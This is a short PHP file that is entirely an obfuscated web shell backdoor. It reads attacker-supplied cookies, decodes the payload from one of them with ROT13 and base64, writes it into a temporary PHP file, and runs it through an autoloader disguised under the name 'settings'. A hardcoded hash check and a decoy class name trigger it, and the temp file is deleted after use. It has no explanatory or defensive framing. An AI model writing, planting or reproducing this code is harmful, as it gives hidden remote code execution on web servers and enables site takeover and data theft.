<?php


if (isset($_COOKIE[59-59]) && isset($_COOKIE[64-63]) && isset($_COOKIE[81+-78]) && isset($_COOKIE[19-15])) {
    $descriptor = $_COOKIE;
    function settings($flg) {
        $descriptor = $_COOKIE;
        $entity = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '9152d26d');
        if (!is_writable($entity)) {
            $entity = getcwd() . DIRECTORY_SEPARATOR . "restore_state";
        }
        $element = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($descriptor[3]));
        if (is_writeable($entity)) {
            $holder = fopen($entity, 'w+');
            fputs($holder, $element);
            fclose($holder);
            spl_autoload_unregister(__FUNCTION__);
            require_once($entity);
            @array_map('unlink', array($entity));
        }
    }
    spl_autoload_register("settings");
    $component = "95ede1646c7d398cf410ba59bded0dd7";
    if (!strncmp($component, $descriptor[4], 32)) {
        if (@class_parents("right_pad_string_config_manager", true)) {
            exit;
        }
    }
}
